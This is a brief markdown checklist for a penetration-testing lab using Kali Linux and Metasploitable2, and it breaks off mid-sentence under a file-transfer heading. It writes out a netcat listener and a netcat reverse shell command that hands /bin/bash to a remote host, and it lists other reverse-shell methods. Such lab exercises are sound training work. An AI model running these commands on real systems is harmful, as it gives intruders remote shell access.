# Last Day - Stendelon tasks

## Env setup
- [ ] Run Kali Linxu
- [ ] Run Metasploitable2
- [ ] Login to Kali
- [ ] Login to Metasploitable2


## Reverse shell (netcat)
- [ ] Confirm

#### On Kali
`netcat -lvnp 4444`

#### On Meta2
`netcat 10.0.2.4 4444 -e /bin/bash`

## Reverse shell (other tools)
- [ ] Confirm

#### On Kali
`netcat -lvnp 4444`

#### On Meta2
- What if netcat is not avaiable ?
- Try other way to setup `reverse shell`
	- bash, php, perl, ruby, telnet

   
## Transfer files
- [ ] Confirm

Transfer file from machine to machine by 
